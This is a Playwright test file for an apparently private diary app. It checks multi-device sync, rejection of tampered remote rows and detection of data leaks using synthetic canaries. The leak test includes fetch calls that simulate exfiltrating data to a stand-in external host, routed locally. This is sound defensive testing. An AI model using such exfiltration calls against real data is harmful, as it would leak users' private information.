import { expect, test } from '@playwright/test'
import { MultiDeviceHarness } from './support/multiDeviceHarness'

test('runs the productive v1→v2 lifecycle, unlock, durable writes and read-only join', async ({ browser }) => {
  test.setTimeout(180_000)
  const harness = new MultiDeviceHarness(browser)
  const deviceA = await harness.device('productive-A')
  const deviceB = await harness.device('productive-B')
  try {
    await Promise.all([deviceA.page.goto('/'), deviceB.page.goto('/')])
    await harness.authenticate(deviceA, 'productive_v2_initial_auth_000001')

    const created = await harness.establishProductiveV2(deviceA)
    expect(created).toMatchObject({ writerStatus: 'writer_active', painCount: 2 })
    const firstCanonical = await harness.verifyProductiveV2Remote(deviceA)
    expect(firstCanonical).toMatchObject({ kind: 'canonical_full', writerStatus: 'writer_active' })
    expect(firstCanonical.coveredRowCount).toBe(created.coveredRowCount)

    const resumed = await harness.reloadUnlockAndContinueProductiveV2(deviceA, created)
    expect(resumed).toMatchObject({ writerStatus: 'writer_active', painCount: 3 })
    const secondCanonical = await harness.verifyProductiveV2Remote(deviceA)
    expect(secondCanonical).toMatchObject({ kind: 'canonical_full', writerStatus: 'writer_active' })
    expect(secondCanonical.coveredRowCount).toBeGreaterThan(firstCanonical.coveredRowCount)
    expect(await harness.scanBrowserPersistence(deviceA, [
      'productive-v2-before-upgrade',
      'productive-v2-after-upgrade',
      'productive-v2-after-reload',
      'multi-device-oauth-sentinel',
    ])).toEqual([])

    const originalRows = harness.snapshotRemoteProtocolRows(resumed.remoteId)
    const hostileRows: string[][][] = [
      originalRows.slice(0, -1),
      [originalRows[1]!, originalRows[0]!, ...originalRows.slice(2)],
      [...originalRows.slice(0, 1), ['AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA', 'AAAAAAAAAAAAAAAA', 'AAAA'], ...originalRows.slice(1)],
      originalRows.map((row, index) => index === originalRows.length - 1
        ? [row[0]!, row[1]!, `${row[2]!.slice(0, -1)}${row[2]!.endsWith('A') ? 'B' : 'A'}`]
        : row),
      [],
    ]
    for (const rows of hostileRows) {
      harness.replaceRemoteProtocolRows(resumed.remoteId, rows)
      await expect(harness.refreshProductiveV2(deviceA)).rejects.toThrow()
    }
    harness.replaceRemoteProtocolRows(resumed.remoteId, [...originalRows, originalRows.at(-1)!])
    await harness.refreshProductiveV2(deviceA)
    expect(await harness.verifyProductiveV2Remote(deviceA)).toMatchObject({ kind: 'canonical_full', writerStatus: 'writer_active' })
    harness.replaceRemoteProtocolRows(resumed.remoteId, originalRows)

    await harness.authenticate(deviceB, 'productive_v2_join_auth_00000001')
    const joined = await harness.joinAndUnlockProductiveV2(deviceB, resumed)
    expect(joined.writerStatus).toBe('read_only')
    expect(joined.painCount).toBe(3)
    expect(joined.notes).toEqual([
      'productive-v2-after-reload',
      'productive-v2-after-upgrade',
      'productive-v2-before-upgrade',
    ])
    expect(await harness.verifyProductiveV2Remote(deviceB)).toMatchObject({
      kind: 'canonical_full', writerStatus: 'read_only', coveredRowCount: secondCanonical.coveredRowCount,
    })
    expect(await harness.scanBrowserPersistence(deviceB, [...joined.notes, 'multi-device-oauth-sentinel'])).toEqual([])
  } finally {
    await harness.close()
  }
})


test('detects redacted synthetic Diary request, console and error leaks but excludes Auth-origin logs', async ({ browser }) => {
  const harness = new MultiDeviceHarness(browser)
  const device = await harness.device('browser-security-sentinel-probe')
  const sentinels = [
    'synthetic-diary-request-url-canary',
    'synthetic-diary-request-body-canary',
    'synthetic-diary-console-canary',
    'synthetic-diary-pageerror-canary',
    'synthetic-auth-origin-credential-canary',
    'synthetic-diary-request-header-canary',
    'synthetic-diary-dom-canary',
    'synthetic-diary-webstorage-canary',
    'synthetic-diary-indexeddb-canary',
    'synthetic-diary-cache-canary',
    'synthetic-external-request-url-canary',
    'synthetic-external-request-body-canary',
  ] as const
  try {
    await device.page.goto('/')
    await device.context.route('**/__leak_probe**', (route) => route.fulfill({ status: 204, body: '' }))
    const urlRequest = device.page.waitForEvent('request', (request) => request.url().includes(sentinels[0]))
    await device.page.evaluate(async (needle) => { await fetch(`/__leak_probe?probe=${encodeURIComponent(needle)}`) }, sentinels[0])
    await urlRequest

    const bodyRequest = device.page.waitForEvent('request', (request) => request.postData()?.includes(sentinels[1]) === true)
    await device.page.evaluate(async (probe) => {
      await fetch('/__leak_probe', {
        method: 'POST',
        headers: { 'x-synthetic-diary-check': probe.header },
        body: probe.body,
      })
    }, { body: sentinels[1], header: sentinels[5] })
    await bodyRequest

    // Cross-origin exfiltration attempted by the Diary page must still be
    // inspected. Route all probe traffic locally; nothing reaches the host.
    await device.context.route('https://synthetic-external-leak.invalid/**', (route) =>
      route.fulfill({ status: 204, body: '' }))
    const externalUrlRequest = device.page.waitForEvent('request', (request) => request.url().includes(sentinels[10]))
    await device.page.evaluate(async (needle) => {
      await fetch(`https://synthetic-external-leak.invalid/__leak_probe?probe=${encodeURIComponent(needle)}`, { mode: 'no-cors' })
    }, sentinels[10])
    await externalUrlRequest
    const externalBodyRequest = device.page.waitForEvent('request', (request) => request.postData()?.includes(sentinels[11]) === true)
    await device.page.evaluate(async (needle) => {
      await fetch('https://synthetic-external-leak.invalid/__leak_probe', {
        method: 'POST', mode: 'no-cors', body: needle,
      })
    }, sentinels[11])
    await externalBodyRequest

    const consoleEvent = device.page.waitForEvent('console', (message) => message.text().includes(sentinels[2]))
    await device.page.evaluate((needle) => console.warn(needle), sentinels[2])
    await consoleEvent

    const errorEvent = device.page.waitForEvent('pageerror', (error) => error.message.includes(sentinels[3]))
    await device.page.evaluate((needle) => {
      setTimeout(() => { throw new Error(needle) }, 0)
    }, sentinels[3])
    await errorEvent

    // Positive controls for each persistent browser surface, not just a
    // negative scan of normal product writes.
    await device.page.evaluate(async (probe) => {
      const element = document.createElement('span')
      element.textContent = probe.dom
      document.body.append(element)
      localStorage.setItem('synthetic-security-scan-check', probe.storage)
      sessionStorage.setItem('synthetic-security-scan-check', probe.storage)
      await new Promise<void>((resolve, reject) => {
        const request = indexedDB.open('synthetic-security-scan-check', 1)
        request.onupgradeneeded = () => { request.result.createObjectStore('values') }
        request.onerror = () => reject(request.error)
        request.onsuccess = () => {
          const db = request.result
          const transaction = db.transaction('values', 'readwrite')
          transaction.objectStore('values').put(probe.indexedDb, 'probe')
          transaction.oncomplete = () => { db.close(); resolve() }
          transaction.onerror = () => reject(transaction.error)
        }
      })
      const cache = await caches.open('synthetic-security-scan-check')
      await cache.put('/__leak_probe_cache', new Response(probe.cache))
    }, { dom: sentinels[6], storage: sentinels[7], indexedDb: sentinels[8], cache: sentinels[9] })

    const authPage = await device.context.newPage()
    await authPage.goto('/google-auth/')
    await authPage.evaluate((needle) => console.warn(needle), sentinels[4])
    await authPage.close()

    const hits = await harness.scanBrowserPersistence(device, sentinels)
    for (const required of [
      'request-url:sentinel-0',
      'request-body:sentinel-1',
      'console:sentinel-2',
      'page-error:sentinel-3',
      'request-headers:sentinel-5',
      'dom:sentinel-6',
      'localStorage:synthetic-security-scan-check:sentinel-7',
      'sessionStorage:synthetic-security-scan-check:sentinel-7',
      'indexedDB:synthetic-security-scan-check:values:sentinel-8',
      'cache:synthetic-security-scan-check:response:sentinel-9',
      'request-url:sentinel-10',
      'request-body:sentinel-11',
    ]) expect(hits).toContain(required)
    expect(hits.some((hit) => hit.endsWith('sentinel-4'))).toBe(false)
    // Failure diagnostics report only location and sentinel index.
    for (const sentinel of sentinels) expect(hits.join(' ')).not.toContain(sentinel)
  } finally {
    await harness.close()
  }
})
